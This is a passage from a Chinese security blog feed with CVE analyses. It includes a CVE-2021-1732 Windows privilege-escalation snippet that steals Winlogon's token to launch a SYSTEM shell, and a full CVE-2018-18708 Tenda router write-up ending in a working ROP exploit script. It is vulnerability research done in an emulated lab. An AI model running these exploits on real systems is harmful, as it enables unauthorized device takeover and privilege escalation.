        SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_EXTRA_SIZE_OFF, 0x100 );                // our specified size
        SetWindowLongPtr(hTargetWnd, TAGWND_BODY_EXTRA_SIZE_OFF, 0x100);                                    // out specified size
    }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="创建拷贝进程token的cmd进程"><a href="#创建拷贝进程token的cmd进程" class="headerlink" title="创建拷贝进程token的cmd进程"></a>创建拷贝进程token的cmd进程</h3><pre class="line-numbers language-none"><code class="language-none">BOOL GetProIDByName(PCWCHAR ImageName, ULONG_PTR* ProcIDPtr)
{
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe32;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return FALSE;

	pe32.dwSize = sizeof(pe32);

	if (Process32First(hSnapshot, &amp;pe32))
	{
		do {
			if (lstrcmpi(ImageName, pe32.szExeFile) == 0)
			{
				CloseHandle(hSnapshot);
				*ProcIDPtr = pe32.th32ProcessID;
				return TRUE;
			}
		} while (Process32Next(hSnapshot, &amp;pe32));
	}

	CloseHandle(hSnapshot);
	return FALSE;
}

VOID CreateEopProc() {
	HANDLE hProc;
	HANDLE hToken;
	HANDLE hEopToken;
	ULONG_PTR ulWinlogonPID = 0;

	if (!GetProIDByName(L"Winlogon.exe", &amp;ulWinlogonPID) || !ulWinlogonPID)
		return;

	hProc = OpenProcess(
		PROCESS_QUERY_INFORMATION,
		FALSE,
		ulWinlogonPID );

	OpenProcessToken(
		hProc,
		TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
		&amp;hToken);


	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &amp;hEopToken))
		return;

	/* Starts a new process with SYSTEM token */
	STARTUPINFOW si = {};
	PROCESS_INFORMATION pi = {};
	CreateProcessWithTokenW(
		hEopToken,
		LOGON_NETCREDENTIALS_ONLY,
		L"C:\\Windows\\System32\\cmd.exe",
		NULL,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&amp;si,
		&amp;pi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="恢复环境"><a href="#恢复环境" class="headerlink" title="恢复环境"></a>恢复环境</h3><p>需要还原所有使用SetWindowLong/SetWindowLongStr修改的数据</p>
<pre class="line-numbers language-none"><code class="language-none">pFakeItems[0] = (ULONG_PTR)(ulDesktopHeapBase + ulWndOffset + ulTagWndBodySize + TAGWND_BODY_REL_FLAG_OFF - 0x40);  //这里是查看相邻窗口tagWNDk的flag的值
ulValue = 0;
ulValue = ReadPrimitive(hTargetWnd);
//这里读取相邻窗口上的flag数据（准备被删除0x800属性）

SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_REL_FLAG_OFF, ulValue &amp; ~0x800);        
//删除相邻窗口的flag的0x800属性
SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_REL_VALUE_OFF, 0);
// 将相邻窗口的扩展内存设置为0
SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_EXTRA_SIZE_OFF, 0x100 );                
//相邻窗口开始定义窗口的cbWndExtra
SetWindowLongPtr(hTargetWnd, TAGWND_BODY_EXTRA_SIZE_OFF, 0x100);                                    
//目标窗口开始定义窗口的cbWndExtra

{
ULONG_PTR ulWndOffset = 0x0;
ULONG_PTR ulValue = 0x0;

ulWndOffset = GetWndObjOffset((ULONG_PTR)hTargetWnd);

pFakeItems[0] = (ULONG_PTR)(ulDesktopHeapBase + ulWndOffset + TAGWND_BODY_REL_FLAG_OFF - 0x40);
ulValue = 0;
ulValue = ReadPrimitive(hTargetWnd);
//这里读取到目标窗口上的flag数据（准备被删除0x800属性）


SetWindowLongPtr(hTargetWnd, GWLP_ID, 0x0);
// 将目标窗口载入的Spmenu设置为0
SetWindowLong(hTargetWnd, TAGWND_BODY_STYLE_OFF, 0x04c00000);
// 将目标窗口中的style还原
SetWindowLongPtr(hTargetWnd, TAGWND_BODY_REL_FLAG_OFF, ulValue &amp; ~0x800);
// 将目标窗口中的flag删除0x800属性
SetWindowLongPtr(hTargetWnd, TAGWND_BODY_REL_VALUE_OFF, 0);
// 将目标窗口的扩展内存设置为0
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><p>补丁打在了win32kfull!xxxCreateWindowEx</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809111624710.png"></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2018-18708 Tenda路由器栈溢出分析</title>
    <url>/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2018-18708是Tenda路由器的httpd存在缓冲区溢出漏洞。可以利用该漏洞造成拒绝服务。</p>
<p>影响版本：</p>
<pre class="line-numbers language-none"><code class="language-none">AC7 V15.03.06.44_CN
AC9 V15.03.05.19_CN
AC10 V15.03.06.23_CN
AC15 V15.03.05.19_CN
AC18 V15.03.05.19(6318)_CN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h3><p>US_AC15V1.0BR_V15.03.05.19_multi_TD01</p>
<h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>提取固件运行httpd可执行文件</p>
<pre class="line-numbers language-none"><code class="language-none">binwalk -Me US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查看文件信息，是arm</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116165640011.png"></p>
<p>qemu执行</p>
<pre class="line-numbers language-none"><code class="language-none">cd _US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin.extracted/squashfs-root
cp $(which qemu-arm-static) ./
sudo chroot ./ ./qemu-arm-static ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>会卡在Welcome to</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114111007129.png"></p>
<h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>ida分析发现sub_2E420，发现welcome to之后有两处check，第一处check不通过会进入休眠状态，第二个检查连接情况，不通过会打印连接失败。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114112513082.png"></p>
<p>patch掉这两处的检测</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144110897.png"></p>
<p>patch掉之后继续执行</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114144236394.png"></p>
<p>安装uml-utilities</p>
<pre class="line-numbers language-none"><code class="language-none">sudo apt install uml-utilities<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>安装bridge-utils</p>
<pre class="line-numbers language-none"><code class="language-none">https://mirrors.edge.kernel.org/pub/linux/utils/net/bridge-utils/bridge-utils-1.7.1.tar.xz
tar -xvf bridge-utils-1.7.1.tar.xz
autoconf
./configure
make
sudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113136378.png"></p>
<h4 id="定位ip"><a href="#定位ip" class="headerlink" title="定位ip"></a>定位ip</h4><p>搜索字符串Listen ip定位到sub_1B84C函数</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115113711000.png"></p>
<p>分析调用链</p>
<p><code>sub_2E420 -&gt; sub_2E9EC -&gt; sub_29510  -&gt; sub_29818 -&gt;  sub_1B84C</code></p>
<p>函数sub_29818调用了sub_1B84C</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115132854149.png"></p>
<pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpd
gdb-multiarch
set architecture arm
b*0x1B84C
target remote:1111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115142522808.png"></p>
<p>对ip参数v8进行定位</p>
<p>v8和s.sa_data[2]、a1有关</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143459247.png"></p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115143338834.png"></p>
<p>往上回溯，sub_29818调用了sub_1B84C，sub_29818的v8是了sub_1B84C的第一个参数a1</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115144144585.png"></p>
<p>往上回溯到sub_2E420，ip的值与s和v19有关。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115150620540.png"></p>
<p>查看getIfIp</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115151018366.png"></p>
<p>getIfIp为外部导入函数，位于libcommon.so中</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160146351.png"></p>
<p>ioctl有三个参数，第一个参数fd由socket()系统调用返回，第二个参数获取IP地址。第三个参数与getLanIfName函数有关。</p>
<p>因此函数整体流程为获取IP地址返回v2，v2的值为0不会进入if循环，ip的值由v19决定，v19是getIfIp函数的第二个参数v2，系统调用获取IP后赋给a2(v19)。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115160907362.png"></p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161237390.png"></p>
<p>getLanIfName会调用get_eth_name函数，参数写死为0，get_eth_name在libChipApi.so中，查看libChipApi.so中的get_eth_name函数，函数返回v1，为网卡名称</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115161516417.png"></p>
<h4 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h4><p>因此整体流程为getLanIfName函数调用get_eth_name函数获取网卡名称，将网卡名称做为参数输入到getIfIp中。函数寻找名称为br0的网卡的ip地址传递给v19。因此让程序监听正确的ip地址需要新建br0网卡。</p>
<pre class="line-numbers language-none"><code class="language-none">sudo brctl addbr br0 
sudo brctl addif br0 eth0
sudo ifconfig br0 up
sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>重新启动找到了br0网卡并获取了ip地址</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141128835.png"></p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141227111.png"></p>
<h3 id="调用链分析"><a href="#调用链分析" class="headerlink" title="调用链分析"></a>调用链分析</h3><pre class="line-numbers language-none"><code class="language-none">函数调用关系：sub_2E420 -&gt;  sub_2E9EC  -&gt;  sub_42378  -&gt;  formSetMacFilterCfg  -&gt;  sub_C14DC  -&gt;  sub_C17A0  -&gt;  sub_C24C0
缓冲区：sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12
字符串src：sub_2BA8C的返回值 -&gt; formSetMacFilterCfg的v17 -&gt; sub_C14DC的a2 -&gt; sub_C17A0的a2 -&gt; sub_C24C0的a1 -&gt; src<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="sub-C24C0"><a href="#sub-C24C0" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p>漏洞点在sub_C24C0的strcpy函数</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221114180104515.png"></p>
<h4 id="sub-C17A0"><a href="#sub-C17A0" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>溢出字符串src是sub_C24C0函数的第一个参数a1，来自sub_C17A0的第二个参数a2</p>
<p>缓冲区a2是sub_C24C0函数的第二个参数a2，来自sub_C17A0的v12。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110605912.png"></p>
<h4 id="sub-C14DC"><a href="#sub-C14DC" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p>sub_C17A0的第二个参数a2来自sub_C14DC的第二个参数a2</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115110852924.png"></p>
<h4 id="formSetMacFilterCfg"><a href="#formSetMacFilterCfg" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数调用了sub_C14DC，sub_C14DC的第二个参数a2来自formSetMacFilterCfg的v17，v17是sub_2BA8C的返回值，程序获取到http请求的deviceList的值，传递给sub_C24C0函数的漏洞点。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115100854082.png"></p>
<h3 id="调用链分支跳转"><a href="#调用链分支跳转" class="headerlink" title="调用链分支跳转"></a>调用链分支跳转</h3><p>函数中有不同功能的处理函数，显示请求到指定路径会调用相应的处理函数。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115172430094.png"></p>
<p>进入formSetMacFilterCfg函数需要访问/goform/setMacFilterCfg</p>
<h4 id="formSetMacFilterCfg-1"><a href="#formSetMacFilterCfg-1" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>formSetMacFilterCfg函数存在两个分支，sub_C10D0和sub_C14DC</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173154042.png"></p>
<p>v19为0才会进入sub_C14DC函数，因此sub_C10D0的返回值需要为0</p>
<h4 id="sub-C10D0"><a href="#sub-C10D0" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115173814704.png"></p>
<p>sub_C10D0的返回值为0需要输入的数据a1为black或者white</p>
<h4 id="sub-C24C0-1"><a href="#sub-C24C0-1" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115174215338.png"></p>
<p>最终到达漏洞点之后会检测包含\r的字符串</p>
<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p>访问 <a href="http://192.168.130.137/goform/setMacFilterCfg">http://192.168.130.137/goform/setMacFilterCfg</a> 抓包</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116141526174.png"></p>
<p>返回{“errCode”:2}</p>
<h4 id="formSetMacFilterCfg-2"><a href="#formSetMacFilterCfg-2" class="headerlink" title="formSetMacFilterCfg"></a>formSetMacFilterCfg</h4><p>进入formSetMacFilterCfg函数，查看setMacFilterCfg接口对应的处理过程。</p>
<p>调用了sub_2BA8C 和 sub_C10D0和sub_C10DC</p>
<p>sub_2BA8C获取前端传过来的表单中获取对应的值。之后传入sub_C210D0</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115183255078.png"></p>
<p>之后会对v19进行判断</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193726115.png"></p>
<h4 id="sub-C10D0-1"><a href="#sub-C10D0-1" class="headerlink" title="sub_C10D0"></a>sub_C10D0</h4><p>对传入的值进行strcmp比较，决定返回的值。</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115193936050.png">判断是black还是white，如果满足其中一个返回0，否则返回2。如果没有就会返回2，所以抓包返回结果为{“errCode”:2}</p>
<p>所以必须传参setMacFilterCfg为black或者white</p>
<h4 id="sub-C14DC-1"><a href="#sub-C14DC-1" class="headerlink" title="sub_C14DC"></a>sub_C14DC</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221115195021958.png"></p>
<p>第二个参数是需要有\n，并且返回其地址。</p>
<p>之后都会进入sub_C17A0函数</p>
<h4 id="sub-C17A0-1"><a href="#sub-C17A0-1" class="headerlink" title="sub_C17A0"></a>sub_C17A0</h4><p>调用了sub_C24C0，将deviceList和v12传入</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093215098.png"></p>
<h4 id="sub-C24C0-2"><a href="#sub-C24C0-2" class="headerlink" title="sub_C24C0"></a>sub_C24C0</h4><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221116093614037.png"></p>
<h3 id="触发测试"><a href="#触发测试" class="headerlink" title="触发测试"></a>触发测试</h3><p>sub_C24C0函数中的缓冲区a2来自sub_C17A0的v12，大小为176</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117141812438.png"></p>
<p>根据http post请求内容构造</p>
<pre class="line-numbers language-none"><code class="language-none">import requests
url = "http://192.168.130.137/goform/setMacFilterCfg"
cookie = {"Cookie":"password=csplqw"}
data = {"macFilterType": "black", "deviceList":"\r" +  "A" * 176 + "bbbb"}
requests.post(url, cookies=cookie, data=data)
requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>测试</p>
<pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpd

gdb-multiarch ./bin/httpd
target remote:1111

python poc.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117144236144.png"></p>
<p>正好覆盖</p>
<h2 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p>开启了NX保护</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117145129715.png"></p>
<h3 id="libc基址"><a href="#libc基址" class="headerlink" title="libc基址"></a>libc基址</h3><p>strcpy函数下断点找函数地址，0x3fdda508</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118173858830.png"></p>
<p>找偏移</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174133012.png"></p>
<p>算基址</p>
<p>0x3fdda508-3e508=0x3fd9C000</p>
<h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><pre class="line-numbers language-none"><code class="language-none">ROPgadget --binary libc.so.0 --only "pop" | grep r3
ROPgadget --binary libc.so.0 | grep "mov r0, sp ; blx r3"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155024462.png"></p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155334715.png"></p>
<p>使用<code>0x00018298 : pop {r3, pc}</code>和 <code>0x00040cb8 : mov r0, sp ; blx r3</code>来构造rop。将第一个r3改成system_addr，将命令放在sp上，之后跳转到system_addr。</p>
<h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p><code>readelf -s libc.so.0 | grep system</code>找system偏移</p>
<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117161402380.png"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>payload结构：[offset,gadget1,system,gadget2]</p>
<pre class="line-numbers language-none"><code class="language-none">import requests
from pwn import *
cmd = b"echo hello"
libc_base = 0x3fd9C000
system_offset = 0x005a270
gadget1_offset = 0x00018298
gadget2_offset = 0x00040cb8
system_addr = libc_base + system_offset
gadget1 = gadget1_offset + libc_base
gadget2 = gadget2_offset + libc_base
payload = b"A"*176 + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd
url = "http://192.168.130.137/goform/setMacFilterCfg"
cookie = {"Cookie":"password=csplqw"}
data = {"macFilterType": "black", "deviceList":b"\r" + payload}
requests.post(url, cookies=cookie, data=data)
requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174737035.png"></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-1054越界写入本地提权分析</title>
    <url>/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2020-1054是win32k.sys内核模块的oob(out of band)漏洞。成功利用可以导致权限提升。漏洞存在于win32k!vStrWrite01函数中，函数在对BitMap对象中的pvScan0成员指向的像素区域进行读写的时候，没有判断读写的地址是否超过BitMap对象的像素点范围，是否越界，导致BSOD的产生。通过合理的内存布局，可以利用漏洞扩大目标BitMap对象的sizelBitmap来扩大BitMap对象的可读写范围，利用扩大读写范围的BitMap对象来修改另一个BitMap对象的pvScan0就能实现任意地址读写。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="蓝屏poc"><a href="#蓝屏poc" class="headerlink" title="蓝屏poc"></a>蓝屏poc</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">##include <span class="token operator">&lt;</span>Windows<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
##include <span class="token operator">&lt;</span>inttypes<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
##include <span class="token operator">&lt;</span>stdint<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
##include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
